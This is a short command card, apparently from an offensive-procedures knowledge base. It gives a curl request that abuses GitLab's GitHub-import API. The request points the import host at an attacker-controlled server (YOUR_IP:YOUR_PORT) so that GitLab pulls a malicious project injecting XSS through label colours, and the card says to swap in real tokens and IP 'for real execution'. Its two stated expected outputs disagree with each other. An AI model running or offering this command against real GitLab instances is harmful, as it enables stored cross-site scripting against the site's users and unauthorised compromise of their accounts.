---
id: cmd-uuid-3
data: >-
  curl -kv "https://gitlab.com/api/v4/import/github" --request POST --header
  "content-type: application/json" --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN"
  --data '{"personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
  "repo_id": "523303538", "target_namespace": "YOUR_GITLAB_USERNAME",
  "new_name": "xss-on-label-color", "github_hostname":
  "http://YOUR_IP:YOUR_PORT"}'
tags:
  - api
  - import
type: command
output: '{"id": ..., "import_status": "started"}'
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:19.863Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-import-generic

## Command

```bash
curl -kv "https://gitlab.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" --data '{"personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "repo_id": "523303538", "target_namespace": "YOUR_GITLAB_USERNAME", "new_name": "xss-on-label-color", "github_hostname": "http://YOUR_IP:YOUR_PORT"}'
```

## Description

Triggers GitLab's GitHub import API to pull a malicious project, injecting XSS via labels.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -kv | Verbose with insecure SSL | Yes |
| PRIVATE-TOKEN | GitLab auth token | Yes |
| --data JSON | Import payload with dummy hostname | Yes |

## Examples

### Basic Usage

As above, with placeholders.

### Advanced Usage

Replace tokens/IP for real execution.

## Expected Output

JSON: {"import_url": ..., "id": 123}.

## Related

- [[Related Procedure|procedures/Import-Malicious-Project-into-GitLab-via-API]]
